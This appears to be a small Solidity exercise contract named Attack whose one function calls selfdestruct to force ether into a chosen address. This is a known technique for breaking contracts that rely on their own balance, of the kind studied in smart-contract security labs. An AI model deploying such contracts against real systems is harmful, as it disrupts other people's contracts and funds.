// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;



contract Attack {

    function attack(address payable _addr) external payable{
        selfdestruct(_addr);
    }
    receive() external payable {
        // This function is intentionally left empty
    }
}

